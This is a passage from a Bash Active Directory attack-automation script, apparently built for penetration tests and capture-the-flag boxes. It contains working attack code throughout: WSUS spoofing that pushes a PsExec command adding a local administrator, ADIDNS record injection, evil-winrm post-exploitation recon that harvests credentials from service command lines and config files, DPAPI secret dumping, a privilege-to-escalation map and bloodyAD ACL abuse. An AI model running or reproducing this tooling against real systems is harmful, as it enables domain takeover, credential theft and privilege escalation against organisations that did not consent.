                    -c "/accepteula /s cmd.exe /c \"net localgroup administrators $USER /add\"" 2>&1 \
                    | tee -a "$LOGFILE" | tee wsus_pywsus.log ) &
                local wpid=$!
                info "PyWSUS serving on :$wport for ${WSUS_TIMEOUT:-180}s — waiting for a client update cycle…"
                wait "$wpid" 2>/dev/null || true
                grep -qiE 'malicious|update sent|client connected|reporting|SYSTEM' "$OUTDIR/wsus_pywsus.log" 2>/dev/null \
                    && loot "★ A client pulled our update → wsus_pywsus.log" \
                    || info "No client pulled an update in the window (clients may poll infrequently)"
                python3 "$dx" -u "${DOMAIN}\\${USER}" $dauth -r "$wlabel" -a remove "$DC_IP" >/dev/null 2>&1 \
                    && info "ADIDNS WSUS record reverted"
            else
                info "No DNS-write permission over '$wlabel' (add denied) → not auto-abusable by this user; playbook below."
            fi
        elif [[ "$DO_ABUSE" == "1" && -z "$carrier" ]]; then
            info "WSUS auto-spoof ready but no Microsoft-signed carrier found — drop PsExec64.exe in $OUTDIR to enable it."
        fi

        subsection "WSUS spoofing playbook (needs a MITM position between a client and ${wsrv:-$probe})"
        detail "  # listener IP auto-derived: ${ip:-<your-ip>}   ·   WSUS: ${wsrv:-$probe}:${wport}"
        detail "  # 1) Carrier = a Microsoft-SIGNED binary (e.g. PsExec64.exe)."
        detail "  # 2) Serve the malicious update on the SAME port the service uses:"
        detail "  python3 ${pw:-pywsus.py} -H ${ip:-<ip>} -p ${wport} -e PsExec64.exe -c '/accepteula /s cmd.exe /c \"net user pwn P@ssw0rd! /add && net localgroup administrators pwn /add\"'"
        detail "  # 3) Redirect the client's WUServer (:${wport}) to you (${ip:-<ip>}): ARP spoof / DHCP / ADIDNS+WPAD."
        detail "  #    NB: writable DNS on this domain → add an A record for the WSUS hostname → ${ip:-<ip>}."
        detail "  # → next client update cycle runs your command as NT AUTHORITY\\SYSTEM."
    elif [[ "$wscheme" == "https" ]]; then
        info "WSUS on HTTPS :${wport} → SSL-protected; spoofing needs a trusted cert / SSL-strip → NOT auto-abusable."
    else
        info "WSUS role present but no WSUS port reachable from here — abusable only from a position that reaches it."
    fi
}

# ===========================================================================
#  WINRM ACCESS + DPAPI  —  where can we land a shell, and what's in DPAPI
# ===========================================================================
# Run whoami /priv + /groups over WinRM and map dangerous rights to techniques
# Run command(s) over evil-winrm (reusing whatever auth we hold) and echo output.
# Kerberos uses KRB5CCNAME + realm (now that the per-run krb5.conf is correct);
# else NTLM -H/-p. Newline-separated commands are run then `exit`.
_winrm_exec() {
    local cmds="$1"
    have evil-winrm || return 1
    local -a ev=(evil-winrm -i "${DC_FQDN:-$DCT}") evenv=()
    if   [[ -n "$KERB_TICKET" ]]; then evenv=(env "KRB5CCNAME=$KERB_TICKET"); ev+=(-r "$DOMAIN")
    elif [[ -n "$HASH" ]];       then ev+=(-u "$USER" -H "${HASH##*:}")
    elif [[ -n "$PASS" ]];       then ev+=(-u "$USER" -p "$PASS")
    else return 1; fi
    printf '%s\nexit\n' "$cmds" | timeout "${WINRM_TO:-90}" "${evenv[@]}" "${ev[@]}" 2>/dev/null
}

# Post-exploitation recon over the WinRM shell — read-only, NO admin needed. Covers
# exactly what the admin-only `nxc --dpapi` can't: our OWN creds (cmdkey/credman),
# flags, and the local privesc surface (AlwaysInstallElevated, non-system32 SYSTEM
# services, SYSTEM scheduled tasks, top-level dirs). Findings feed the engine.
# Service binaries very often embed credentials directly in their ImagePath command
# line (e.g. `C:\Windows\helpdesk.exe -u clifford.davey -p <pw>`) — a classic lateral
# move on a DC with no obvious AD path (this is exactly the Sendai foothold). Read the
# registry ImagePath of EVERY service (svchost-excluded: those are arg-less DLL hosts),
# surface the ones carrying credential-like args, and feed them to harvest_secrets so
# the embedded account is extracted, queued and pivoted AUTOMATICALLY. Run as its OWN
# short command so the big/slow recon below (which can hit the WinRM timeout) can never
# swallow this high-value result.
_winrm_service_creds() {
    have evil-winrm || return
    subsection "Service ImagePaths with inline credentials (registry, svchost-excluded)"
    local ps='Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\*" -Name ImagePath -ErrorAction SilentlyContinue | Select-Object -ExpandProperty ImagePath | Where-Object { $_ -notmatch "svchost" }'
    local raw; raw=$(_winrm_exec "$ps" 2>/dev/null \
        | sed -E 's/\x1b\[[0-9;?]*[a-zA-Z]//g' \
        | grep -avE 'Evil-WinRM|quoting_detection|evil-winrm#|Establishing connection|PS C:\\|^Info: |Exiting with code')
    [[ -z "$raw" ]] && { info "No service ImagePaths read (shell/Kerberos issue)"; return; }
    # Keep only ImagePaths that carry credential-like arguments — those are the loot.
    local creds; creds=$(grep -iE '(-u[: ]|/u:|-user|/user:|-p[: ]|/p:|-pass|-password|/password|credential|/cred)' <<<"$raw")
    if [[ -n "$creds" ]]; then
        loot "${C_RED}${C_BOLD}★★ Service binary with INLINE credentials → harvesting & pivoting:${C_RESET}"
        printf '%s\n' "$creds" | head -20 | while IFS= read -r l; do detail "      ${l//\\/\\\\}"; done
        # process-sub (not a pipe) so queued creds survive in the parent shell.
        harvest_secrets "winrm-service-imagepath" < <(printf '%s\n' "$creds")
    else
        info "No inline-credential service ImagePaths found"
    fi
}

_winrm_postex() {
    have evil-winrm || return
    _winrm_service_creds      # fast, high-value: inline service creds → auto-pivot
    subsection "WinRM post-exploitation recon (as ${USER})"
    local ps
    ps='whoami /all; echo "===CMDKEY==="; cmdkey /list; '
    ps+='echo "===FLAGS==="; Get-ChildItem C:\Users -Recurse -Include user.txt,root.txt,flag.txt -ErrorAction SilentlyContinue | %{ $_.FullName; Get-Content $_.FullName -ErrorAction SilentlyContinue }; '
    ps+='echo "===AIE==="; reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>$null; reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>$null; '
    ps+='echo "===SVC==="; Get-CimInstance Win32_Service | ?{ $_.PathName -notmatch "system32" -and $_.StartName -match "SYSTEM|LocalSystem" } | Select Name,StartName,PathName | Format-List; '
    ps+='echo "===TASKS==="; Get-ScheduledTask -ErrorAction SilentlyContinue | ?{ $_.TaskPath -notmatch "\\Microsoft\\" } | %{ $a=(($_.Actions | %{ ($_.Execute)+" "+($_.Arguments) }) -join "; "); "{0}  [runas={1}]  -> {2}" -f $_.TaskName,$_.Principal.UserId,$a }; '
    ps+='echo "===CDRIVE==="; Get-ChildItem C:\ -Force -ErrorAction SilentlyContinue | Select Name; '
    # Non-standard top-level dirs (e.g. C:\Share) + IIS web roots are the usual
    # local-privesc / cred stash on a DC that has no AD path left. List them and
    # read small config/script/text files; flag anything WE can write (→ hijack).
    ps+='echo "===NONSTD==="; Get-ChildItem C:\ -Directory -Force -ErrorAction SilentlyContinue | ?{ $_.Name -notmatch "^(Windows|Program Files|Program Files \(x86\)|ProgramData|Users|PerfLogs|Recovery|System Volume Information|\$Recycle.Bin|Config.Msi|Documents and Settings)$" } | %{ $_.FullName; Get-ChildItem $_.FullName -Recurse -Force -ErrorAction SilentlyContinue | Select -First 200 -Expand FullName }; '
    ps+='echo "===CONFIGS==="; Get-ChildItem C:\inetpub,C:\Share -Recurse -Force -Include web.config,*.ps1,*.bat,*.cmd,*.txt,*.xml,*.config,*.json,*.ini -ErrorAction SilentlyContinue | Select -First 25 | %{ "### "+$_.FullName; Get-Content $_.FullName -TotalCount 80 -ErrorAction SilentlyContinue }; '
    ps+='echo "===WRITABLE==="; Get-ChildItem C:\inetpub,C:\Share -Recurse -Force -ErrorAction SilentlyContinue | Select -First 400 | %{ try{ $acl=(Get-Acl $_.FullName).Access | ?{ $_.IdentityReference -match "msa_health|Everyone|Authenticated Users|\\\\Users" -and $_.FileSystemRights -match "Write|Modify|FullControl" }; if($acl){ "WRITABLE-BY-US: "+$_.FullName } }catch{} }; '
    # Scripts/files dropped in user PROFILES (Documents/Desktop/Downloads) are a
    # very common intentional foothold (e.g. a monitor.ps1 that names a scheduled
    # task or a writable path). List them and READ the scripts — generic, catches
    # the pattern on any box without hard-coding a path.
    ps+='echo "===PROFFILES==="; Get-ChildItem C:\Users -Force -ErrorAction SilentlyContinue | %{ $p=$_.FullName; @("Documents","Desktop","Downloads") | %{ Get-ChildItem (Join-Path $p $_) -Recurse -Force -ErrorAction SilentlyContinue } } | ?{ $_.Extension -match "\.(ps1|bat|cmd|vbs|py|kdbx|txt|xml|config|json|ini|xlsx|docx)$" } | Select -First 30 -Expand FullName; '
    ps+='echo "===PROFSCRIPTS==="; Get-ChildItem C:\Users -Recurse -Force -Include *.ps1,*.bat,*.cmd,*.vbs,*.py -ErrorAction SilentlyContinue | ?{ $_.FullName -notmatch "\\AppData\\" } | Select -First 12 | %{ "### "+$_.FullName; Get-Content $_.FullName -TotalCount 80 -ErrorAction SilentlyContinue }; '
    # GENERIC privesc auto-finder: for every non-default scheduled task and every
    # service (binary outside system32), check whether the binary/script — or its
    # parent directory — is writable by a low-priv principal (Users/Everyone/Auth
    # Users/Domain Computers, i.e. us). If so, whatever runs it can be hijacked
    # (overwrite the file, or plant a new file / DLL in the writable dir). No
    # hard-coded task names or paths — pure ACL correlation.
    ps+='echo "===HIJACK==="; function _cw($p){ if(-not $p){return ""}; $f=$p.Trim([char]34); $tg=@(); if($f){ $tg+=$f }; $pd=Split-Path $f -Parent; if($pd){ $tg+=$pd }; $o=@(); foreach($t in $tg){ if($t -and (Test-Path $t -ErrorAction SilentlyContinue)){ try{ $a=(Get-Acl $t).Access | ?{ $_.AccessControlType -eq "Allow" -and ($_.FileSystemRights -match "Write|Modify|FullControl|CreateFiles|AppendData|WriteData") -and ($_.IdentityReference -match "Everyone|Authenticated Users|BUILTIN.{0,2}Users|Domain Users|Domain Computers") }; if($a){ $o+=$t } }catch{} } }; return ($o -join "; ") }; '
    ps+='Get-ScheduledTask -ErrorAction SilentlyContinue | ?{ $_.TaskPath -notmatch "\\Microsoft\\" } | %{ $u=$_.Principal.UserId; $n=$_.TaskName; foreach($ac in $_.Actions){ if($ac.Execute){ $w=_cw $ac.Execute; if($w){ "TASK [{0}] runas={1} exec={2}  WRITABLE: {3}" -f $n,$u,$ac.Execute,$w } } } }; '
    ps+='Get-CimInstance Win32_Service -ErrorAction SilentlyContinue | ?{ $_.PathName -and $_.PathName -notmatch "system32" } | %{ $b=$_.PathName; if($b -match ([char]34+"([^"+[char]34+"]+)")){ $b=$Matches[1] } elseif($b -match "^(\S+)"){ $b=$Matches[1] }; $w=_cw $b; if($w){ "SVC [{0}] runas={1} bin={2}  WRITABLE: {3}" -f $_.Name,$_.StartName,$b,$w } }\'
    local out="$OUTDIR/winrm_postex_$(_safe_name "$USER").txt"
    _winrm_exec "$ps" | tee "$out" >>"$LOGFILE"
    [[ ! -s "$out" ]] && { info "WinRM post-ex produced no output (shell/Kerberos issue)"; return; }
    # Strip ANSI + the evil-winrm banner/prompt/echoed-command so we only inspect
    # the REAL command output (otherwise our own PowerShell text gets mis-flagged).
    local clean="$OUTDIR/.winrm_postex_clean.$$"
    sed -E 's/\x1b\[[0-9;?]*[a-zA-Z]//g' "$out" \
        | grep -avE 'Evil-WinRM|quoting_detection|evil-winrm#|Establishing connection|PS C:\\|whoami /all; echo|Info: Exiting|Exiting with code|^Info: ' >"$clean"
    # Show each non-empty section inline so the next step is visible, not buried.
    local sec body
    for sec in HIJACK CMDKEY FLAGS AIE SVC TASKS PROFFILES PROFSCRIPTS NONSTD CONFIGS WRITABLE CDRIVE; do
        body=$(awk "/===${sec}===/{f=1;next} /^===[A-Z]+===/{f=0} f" "$clean" | grep -vE '^[[:space:]]*$')
        [[ -z "$body" ]] && continue
        local cap=15
        case "$sec" in
            HIJACK)     grep -qE 'TASK \[|SVC \[' <<<"$body" || continue; loot "${C_RED}${C_BOLD}★★ HIJACKABLE task/service — its binary or dir is writable by us → overwrite/plant to run AS the listed account:${C_RESET}"; cap=40 ;;
            CMDKEY)     [[ "$body" == *NONE* ]] && continue; loot "★ Stored credentials (cmdkey /list):" ;;
            FLAGS)      loot "★ Flag file(s) readable from this shell:" ;;
            AIE)        grep -qiE '0x1' <<<"$body" && loot "★ AlwaysInstallElevated=1 → MSI as SYSTEM (msfvenom -f msi -p windows/x64/exec)" || continue ;;
            SVC)        loot "★ SYSTEM service(s) with binary OUTSIDE system32 (check write perms → privesc):" ;;
            TASKS)      loot "★ Non-default scheduled tasks (name [runas] → action — hijack the action if it's writable / runs as a priv account):"; cap=30 ;;
            PROFFILES)  loot "★ Scripts/files in user profiles (Documents/Desktop/Downloads):"; cap=30 ;;
            PROFSCRIPTS) loot "★★ Content of profile scripts (reveals tasks, paths, creds → the intended foothold):"; cap=90 ;;
            NONSTD)     loot "★ NON-STANDARD top-level dirs + contents (likely the loot/privesc here):"; cap=60 ;;
            CONFIGS)    loot "★ Config/script/text content (creds? hijackable scripts?):"; cap=80 ;;
            WRITABLE)   loot "★★ Files in C:\\Share / IIS that WE can WRITE → plant/hijack for the account that runs them:" ;;
            CDRIVE)     info "C:\\ top-level:" ;;
        esac
        # detail() runs `echo -e`, which mangles Windows backslash paths (\T→TAB,
        # \A→…). Double the backslashes so they print literally.
        printf '%s\n' "$body" | head -"$cap" | while IFS= read -r l; do detail "      ${l//\\/\\\\}"; done
    done
    # Harvest credentials from script/config content — but ONLY from lines that look
    # like an actual cred assignment (keyword + : or =). Feeding raw script text to
    # the generic harvester flagged identifiers/filenames (OfficeIntegrator.ps1) as
    # "passwords". process-sub (not a pipe) so queued creds survive.
    awk '/===(CONFIGS|PROFSCRIPTS)===/{f=1;next} /^===[A-Z]+===/{f=0} f' "$clean" 2>/dev/null \
        | grep -viE '^###|^\s*#' \
        | grep -iE '(password|passwd|pwd|secret|credential|api[-_ ]?key|connectionstring|conn(ection)?str|token|user(name)?|-p |/p:)\s*[:=]' >"$clean.cfg" 2>/dev/null
    [[ -s "$clean.cfg" ]] && harvest_secrets "winrm-configs" < "$clean.cfg"
    rm -f "$clean" "$clean.cfg" 2>/dev/null
    loot "WinRM post-ex recon saved → $(basename "$out")"
}

analyze_privileges() {
    local args; mapfile -t args < <(nxc_cred_args)
    subsection "Token privileges & dangerous rights (whoami /priv, /groups)"
    local pr; pr=$($NXC winrm "$DCT" "${args[@]}" -x "whoami /priv" 2>&1)
    echo "$pr" | tee -a "$LOGFILE" | tee "$OUTDIR/whoami_priv_${USER}.txt" >/dev/null
    local gr; gr=$($NXC winrm "$DCT" "${args[@]}" -x "whoami /groups" 2>&1)
    echo "$gr" >>"$OUTDIR/whoami_priv_${USER}.txt"

    # Privilege → escalation technique mapping
    local -A P=(
        [SeImpersonatePrivilege]="Potato → PrintSpoofer / GodPotato / JuicyPotatoNG = SYSTEM"
        [SeAssignPrimaryTokenPrivilege]="Token assignment → Potato = SYSTEM"
        [SeBackupPrivilege]="Read ANY file → dump SAM+SYSTEM / NTDS.dit (reg save / robocopy /b)"
        [SeRestorePrivilege]="Write ANY file/registry → service/DLL hijack = SYSTEM"
        [SeDebugPrivilege]="Dump LSASS / inject into SYSTEM processes (mimikatz/nanodump)"
        [SeTakeOwnershipPrivilege]="Take ownership of any object → overwrite & escalate"
        [SeLoadDriverPrivilege]="Load malicious driver → kernel = SYSTEM"
        [SeManageVolumePrivilege]="Raw disk write → plant SYSTEM file"
        [SeTcbPrivilege]="Act as part of the OS = SYSTEM"
        [SeCreateTokenPrivilege]="Forge tokens = SYSTEM"
    )
    # nxc's winrm -x under Kerberos often returns a Python traceback / NTLMSSP parse
    # error / empty string instead of the real command output. If we treat that as
    # "no privileges" we LIE (e.g. it claimed administrator had nothing). So first
    # confirm the output actually looks like whoami's: a 'SeXxxPrivilege' token or
    # the 'Privilege Name' header. Otherwise report it as unreadable, not as empty.
    local priv_ok=0 grp_ok=0
    grep -qiE 'Se[A-Za-z]+Privilege|Privilege Name' <<<"$pr" && priv_ok=1
    grep -qiE 'Group Name|Mandatory Label|BUILTIN\\|NT AUTHORITY|S-1-[0-9]' <<<"$gr" && grp_ok=1

    # Fallback: nxc's winrm -x is flaky under Kerberos (Python traceback / NTLMSSP
    # parse error / empty), so it often can't read the token even though we DO have
    # a shell. evil-winrm speaks WinRM cleanly (Kerberos with KRB5CCNAME+realm, or
    # NTLM with -p/-H) — feed it the commands over stdin and re-parse. (No shell is
    # spawned interactively; it runs the two commands and exits.)
    if [[ "$priv_ok" == "0" ]] && have evil-winrm; then
        subsection "Token read failed over nxc — retrying via evil-winrm"
        local -a ev=(evil-winrm -i "${DC_FQDN:-$DCT}") evenv=()
        if   [[ -n "$KERB_TICKET" ]]; then evenv=(env "KRB5CCNAME=$KERB_TICKET"); ev+=(-r "$DOMAIN")
        elif [[ -n "$HASH" ]];       then ev+=(-u "$USER" -H "${HASH##*:}")
        elif [[ -n "$PASS" ]];       then ev+=(-u "$USER" -p "$PASS")
        fi
        if [[ ${#evenv[@]} -gt 0 || " ${ev[*]} " == *" -u "* ]]; then
            local eout; eout=$(printf 'whoami /priv\nwhoami /groups\nexit\n' \
                               | timeout 60 "${evenv[@]}" "${ev[@]}" 2>/dev/null)
            if grep -qiE 'Se[A-Za-z]+Privilege|Privilege Name' <<<"$eout"; then
                pr="$eout"; gr="$eout"; priv_ok=1
                grep -qiE 'Group Name|Mandatory Label|NT AUTHORITY|S-1-[0-9]' <<<"$eout" && grp_ok=1
                printf '\n--- evil-winrm token read ---\n%s\n' "$eout" >>"$OUTDIR/whoami_priv_${USER}.txt"
                ok "Token read via evil-winrm (whoami /priv + /groups)"
            fi
        fi
    fi

    if [[ "$priv_ok" == "0" && "$grp_ok" == "0" ]]; then
        warn "Could not read the token over WinRM (exec failed/blocked) — privileges UNKNOWN, not empty (see whoami_priv_${USER}.txt)"
        return
    fi

    local found=0 k
    if [[ "$priv_ok" == "1" ]]; then
        for k in "${!P[@]}"; do
            if echo "$pr" | grep -qi "$k"; then loot "★ Dangerous privilege: ${C_BOLD}$k${C_RESET} → ${P[$k]}"; found=1; fi
        done
    fi
    # Dangerous group memberships
    local g
    if [[ "$grp_ok" == "1" ]]; then
        for g in "Backup Operators" "Server Operators" "Account Operators" "DnsAdmins" \
                 "Print Operators" "Hyper-V Administrators" "Group Policy Creator Owners" \
                 "Schema Admins" "Enterprise Admins" "Domain Admins" "Administrators"; do
            echo "$gr" | grep -qi "$g" && { loot "★ Privileged group: ${C_BOLD}$g${C_RESET} → known escalation path"; found=1; }
        done
    fi
    [[ "$priv_ok" == "1" && "$found" == "0" ]] && info "No standout dangerous privileges/groups on this token"
    [[ "$priv_ok" == "0" && "$grp_ok" == "1" ]] && info "Read groups but not privileges over WinRM (whoami /priv exec failed) — see whoami_priv_${USER}.txt"
}

phase_winrm_dpapi() {
    [[ "$HAVE_AUTH" != "1" ]] && return
    section "WINRM ACCESS & DPAPI SECRETS"
    local args; mapfile -t args < <(nxc_cred_args)

    if [[ "$CAP_WINRM" == "1" ]]; then
        subsection "WinRM: can this account get a remote shell?"
        run "$NXC winrm $DCT ${args[*]}"
        local w; w=$($NXC winrm "$DCT" "${args[@]}" 2>&1)
        # nxc's winrm check frequently blows up under Kerberos while parsing the
        # negotiate challenge ("Unpacked data doesn't match … NTLMSSP", a Traceback
        # in enum_host_info). That's an nxc bug, NOT a lack of access — so don't
        # spew the traceback to the operator; keep it in the log and decide WinRM
        # eligibility from group membership, which is authoritative.
        local winrm_err=0
        if grep -qiE 'NTLMSSP|Traceback|proto_flow|Unpacked data|object has no attribute' <<<"$w"; then
            winrm_err=1; printf '%s\n' "$w" >>"$LOGFILE"
        else
            echo "$w" | tee -a "$LOGFILE"
        fi

        # Decide WinRM access by GROUND TRUTH, not by group membership. Being in
        # 'Remote Management Users' is only a hint (over-reports — disabled WinRM,
        # nested groups, regex false-matches), and nxc winrm is unreliable under
        # Kerberos (prints neither [+] nor an error even when access exists). So we
        # CONFIRM by executing `whoami` over evil-winrm: a real shell echoes our
        # account. Group membership is read for display only, plus a clearly-labelled
        # fallback when evil-winrm isn't installed and so we can't actually confirm.
        local rmu="" can_winrm=0 confirmed=0
        local u_re; u_re=$(printf '%s' "$USER" | sed 's/[][\.^$*+?(){}|]/\\&/g')
        if grep -qiE 'WINRM.*\(Pwn3d!\)' <<<"$w"; then can_winrm=1; confirmed=1
        elif have evil-winrm; then
            local _wt; _wt=$(_winrm_exec 'whoami' 2>/dev/null | tr -d '\r')
            if grep -qiF -- "${USER%\$}" <<<"$_wt" \
               && ! grep -qiE 'Authorization|Access is denied|FailedToOpen|WinRM[A-Za-z]*Error|cannot' <<<"$_wt"; then
                can_winrm=1; confirmed=1
            fi
        fi
        [[ -n "${OWNED_ADMIN[${USER,,}]:-}" ]] && can_winrm=1
        if [[ "$CAP_LDAP" == "1" ]]; then
            rmu=$($NXC ldap "$DCT" "${args[@]}" -M group-mem -o GROUP="Remote Management Users" 2>/dev/null)
            printf '%s\n' "$rmu" >>"$LOGFILE"; printf '%s\n' "$rmu" >"$OUTDIR/winrm_users.txt"
            # Group fallback ONLY when we couldn't truly confirm (no evil-winrm).
            if [[ "$confirmed" == "0" && "$can_winrm" == "0" ]] && ! have evil-winrm \
               && grep -qiE "(\\\\|[[:space:]])${u_re}([[:space:]]|\$)" <<<"$rmu"; then
                can_winrm=1
            fi
        fi

        if [[ "$can_winrm" == "1" && "$confirmed" == "1" ]]; then
            loot "★ ${USER} has WinRM shell access!"
        elif [[ "$can_winrm" == "1" ]]; then
            warn "${USER} is in Remote Management Users (WinRM LIKELY) — could not confirm a shell; verify with the line below"
        fi
        if [[ "$can_winrm" == "1" ]]; then
            if [[ -n "$KERB_TICKET" ]]; then
                ok "Shell:  KRB5CCNAME=$KERB_TICKET evil-winrm -i $DC_FQDN -r $DOMAIN"
            else
                ok "Shell:  evil-winrm -i $DC_FQDN -u $USER $( [[ -n "$HASH" ]] && echo "-H $HASH" || echo "-p '<pass>'" )"
            fi
            analyze_privileges
            _winrm_postex
        else
            info "${USER} cannot WinRM (no confirmed shell; not Pwn3d / not in Remote Management Users)"
        fi

        if [[ "$CAP_LDAP" == "1" ]]; then
            subsection "Members of 'Remote Management Users' (who can WinRM)"
            if [[ -n "$rmu" ]]; then echo "$rmu"; else info "none / not readable"; fi
        fi
    else
        info "WinRM (5985) not exposed on this host"
    fi

    if [[ "$CAP_SMB" == "1" ]]; then
        subsection "DPAPI: dumping protected secrets (needs local admin on target)"
        run "$NXC smb $DCT ${args[*]} --dpapi"
        local d; d=$($NXC smb "$DCT" "${args[@]}" --dpapi 2>&1); echo "$d" | tee -a "$LOGFILE" | tee "$OUTDIR/dpapi.txt"
        if echo "$d" | grep -qiE 'access.?denied|not.*admin|ERROR'; then
            info "DPAPI needs local admin — not available with this account (expected if not privileged)"
        fi
        # Harvest any plaintext DPAPI recovered → feed the engine
        while read -r p; do
            [[ -n "$p" ]] && { loot "DPAPI secret recovered: ${C_GREEN}$p${C_RESET}"; add_secret "$p" "DPAPI"; }
        done < <(echo "$d" | grep -oiP '(password|secret)\s*:\s*\K\S+' | sort -u)
        grep -qiE '\[CREDENTIAL\]|Saved' "$OUTDIR/dpapi.txt" 2>/dev/null && loot "DPAPI credential blobs decrypted → dpapi.txt"
    fi

    # Flag DPAPI material pulled from shares earlier. `-print -quit` stops find at
    # the first hit → tiny output, so grep -q can't SIGPIPE find under pipefail
    # (which would falsely report "no blobs"). Offline decryption itself runs
    # automatically inside phase_share_loot (phase_dpapi_offline).
    if find "$OUTDIR/shares" \( -ipath '*Protect*' -o -ipath '*Credentials*' \) -print -quit 2>/dev/null | grep -q .; then
        info "Offline DPAPI blobs present in looted shares (auto-decrypted in the share-looting phase)"
    fi
}

# ===========================================================================
#  ACL ABUSE  —  enumerate exploitable rights and (optionally) abuse them
# ===========================================================================
# bloodyAD authentication arguments for the current credential
bloody_args() {
    local a=(--host "$DCT" --dc-ip "$DC_IP" -d "$DOMAIN" -u "$USER")
    if   [[ "$KERBEROS" == "1" && -n "$KERB_TICKET" ]]; then a+=(-k)
    elif [[ -n "$HASH" ]]; then a+=(-p ":$HASH")
    else a+=(-p "$PASS"); fi
    printf '%s\n' "${a[@]}"
}

bloody_args_plain() {
    local a=(--host "$DCT" --dc-ip "$DC_IP" -d "$DOMAIN" -u "$USER")
    if   [[ -n "$HASH" ]]; then a+=(-p ":$HASH")
    elif [[ -n "$PASS" ]]; then a+=(-p "$PASS")
    else return 1; fi
    printf '%s\n' "${a[@]}"
}

# Record the current (authenticated) identity as compromised, with the groups it
# belongs to, so the final summary can list "who we own" and crown the admins.
# Group membership is read via LDAP memberOf (bloodyAD) — any authenticated user
# can read it, so it works for every owned account, not just WinRM-capable ones.
record_owned_identity() {
    [[ "$HAVE_AUTH" != "1" || -z "$USER" ]] && return
    local key="${USER,,}"                                  # case-insensitive (Bob == bob)
    [[ -n "${OWNED_GROUPS[$key]:-}" ]] && return           # already recorded this principal
    local groups="" ba
    if have bloodyAD && [[ "$CAP_LDAP" == "1" ]]; then
        mapfile -t ba < <(bloody_args)
        groups=$(bloodyAD "${ba[@]}" get object "$USER" --attr memberOf 2>/dev/null \
                 | grep -oiP 'CN=\K[^,]+' | paste -sd', ' -)
    fi
    OWNED_GROUPS["$key"]="${groups:-—}"
    local admin=0
    grep -qiE "$ADMIN_GROUP_RE" <<<"$groups" && admin=1
    [[ "$key" == "administrator" ]] && admin=1
    [[ "$admin" == "1" ]] && OWNED_ADMIN["$key"]=1
    printf '%s\t%s\t%s\n' "$USER" "$([[ $admin == 1 ]] && echo ADMIN || echo user)" "${groups:-—}" \
        >>"$OUTDIR/owned_principals.txt"
}

phase_acl() {
    [[ "$HAVE_AUTH" != "1" ]] && return
    section "ACL ANALYSIS · EXPLOITABLE PERMISSIONS"
    [[ "$CAP_LDAP" != "1" ]] && { warn "LDAP not exposed → ACL analysis needs LDAP, skipping"; return; }
    have bloodyAD || { warn "bloodyAD unavailable, skipping ACL analysis"; return; }
    local ba; mapfile -t ba < <(bloody_args)
    local -A ABUSED=()   # object:action already handled, so we fire each once

    subsection "Objects the current account can write (bloodyAD get writable)"
    run "bloodyAD ${ba[*]} get writable --detail"
    local w; w=$(bloodyAD "${ba[@]}" get writable --detail 2>&1); echo "$w" | tee -a "$LOGFILE"
    local sname; sname="$(_safe_name "$USER")"
    echo "$w" >"$OUTDIR/acl_writable_${sname}.txt"

    if ! echo "$w" | grep -qiE 'distinguishedName|WRITE|GenericAll|Owner'; then
        info "No exploitable outbound ACLs for $USER"
        return
    fi
    loot "$USER holds writable rights over one or more objects — see acl_writable_${sname}.txt"

    # Parse candidate target objects (CN of each writable DN) and their rights
    # bloodyAD groups output per-object: a 'distinguishedName: CN=...' line followed by the granted permissions.
    local cur_dn="" cur_name="" cur_sam="" cur_class=""
    while IFS= read -r line; do
        if [[ "$line" =~ distinguishedName:\ *(.*) ]]; then
            cur_dn="${BASH_REMATCH[1]}"
            cur_name=$(echo "$cur_dn" | grep -oiP '^(CN|OU)=\K[^,]+')
            cur_class=""
            [[ "$cur_dn" =~ ^[Oo][Uu]= ]] && cur_class="ou"   # organizational unit
            # Resolve the sAMAccountName — abuse tools need it, NOT the CN/display
            # name. A "CN=Jane Doe" must become "jane.doe" or every reset/
            # shadow/RBCD against it fails (a display-name CN stalls the chain).
            # One lookup gets BOTH the sAMAccountName AND the objectClass, so we
            # reliably know if the target is a group/computer/OU regardless of
            # whether bloodyAD's writable output spelled it out (this is what makes
            # AddSelf→group detection work — the group DN rarely contains 'group').
            local _obj; _obj=$(bloodyAD "${ba[@]}" get object "$cur_dn" --attr sAMAccountName,objectClass 2>/dev/null)
            cur_sam=$(grep -oiP 'sAMAccountName:\s*\K\S+' <<<"$_obj" | head -1)
            [[ -z "$cur_sam" ]] && cur_sam="$cur_name"
            if [[ -z "$cur_class" ]]; then
                if   grep -qiE 'objectClass:.*\bcomputer\b'           <<<"$_obj"; then cur_class="computer"
                elif grep -qiE 'objectClass:.*\bgroup\b'              <<<"$_obj"; then cur_class="group"
                elif grep -qiE 'objectClass:.*\borganizationalUnit\b' <<<"$_obj"; then cur_class="ou"
                elif grep -qiE 'objectClass:.*\buser\b'               <<<"$_obj"; then cur_class="user"; fi
            fi
            # DC=…,DC=… with no CN. Two very different beasts:
            #  · a DNS zone (…,CN=MicrosoftDNS,…) → ADIDNS record injection
            #  · the domain head itself           → writeDacl here means DCSync
            if [[ -z "$cur_name" && "$cur_dn" =~ ^[Dd][Cc]= ]]; then
                if [[ "$cur_dn" =~ [Mm]icrosoft[Dd][Nn][Ss]|DnsZones ]]; then
                    cur_name="${cur_dn%%,*}"; cur_class="dns"; cur_sam="$cur_name"
                else
                    cur_name="${DOMAIN:-domain}"; cur_sam="$cur_name"; cur_class="domain"
                fi
            fi
        fi
        [[ "$line" =~ objectClass.*group ]]    && cur_class="group"
        [[ "$line" =~ objectClass.*user  ]]    && cur_class="user"
        [[ "$line" =~ objectClass.*computer ]] && cur_class="computer"
        [[ "$line" =~ objectClass.*organizationalUnit ]] && cur_class="ou"

        # Only react to rights that ACTUALLY escalate — ignore benign attribute
        # writes (thumbnailPhoto, pager, …). Each object+action fires once.
        [[ -z "$cur_name" ]] && continue
        local ll="${line,,}" act=""
        if   [[ "$ll" == *keycredentiallink* ]]; then act="shadow"
        elif [[ "$ll" == *allowedtoactonbehalfofotheridentity* ]]; then act="rbcd"
        elif [[ "$ll" == *serviceprincipalname* ]]; then act="spn"
        elif [[ "$cur_class" == "dns" && ( "$ll" == *create_child* || "$ll" == *writeproperty* || "$ll" == *genericall* ) ]]; then act="dns"
        # Any right that lets us write a GROUP's membership → add ourselves. This
        # must catch AddSelf (Self-Membership) and AddMember too, which bloodyAD
        # surfaces as 'member'/'self', NOT as GenericAll — so keying only on
        # GenericAll (the old behaviour) silently missed AddSelf→privileged-group.
